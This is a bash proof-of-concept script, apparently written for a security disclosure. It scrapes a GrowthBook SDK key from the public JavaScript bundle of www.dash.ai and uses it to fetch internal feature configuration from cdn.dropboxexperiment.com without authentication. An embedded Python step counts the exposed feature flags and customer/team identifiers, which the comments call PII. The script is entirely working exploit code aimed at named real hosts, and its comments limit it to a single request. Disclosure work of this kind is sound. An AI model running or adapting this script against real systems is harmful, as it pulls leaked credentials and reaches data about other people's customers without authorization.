#!/usr/bin/env bash
# PoC 4 — Leaked GrowthBook SDK key -> unauthenticated read of internal feature config.
# Key is extracted from the same in-scope public bundle (*.dash.ai).
# NOTE: single GET only. Do NOT mass-enumerate; customer identifiers in the payload are PII.
set -euo pipefail

BUNDLE=$(curl -s https://www.dash.ai/ | grep -oE 'static/js/main\.[A-Z0-9]+\.js' | head -1)
KEY=$(curl -s "https://www.dash.ai/$BUNDLE" | grep -oE 'sdk-[A-Za-z0-9]{16}' | head -1)
echo "[*] GrowthBook SDK key from public bundle: $KEY"

curl -s -w '\n[*] HTTP %{http_code}, %{size_download} bytes\n' \
  "https://cdn.dropboxexperiment.com/api/features/${KEY}" -o /tmp/gb_poc.json

python3 - <<'PY'
import json
d=json.load(open("/tmp/gb_poc.json")); f=d.get("features",d)
pids={s for s in json.dumps(f).split('"') if s.startswith("pid_eci:")}
print(f"[*] Internal feature flags exposed : {len(f)}")
print(f"[*] Unique customer/team PIDs       : {len(pids)}  (values intentionally NOT printed)")
PY
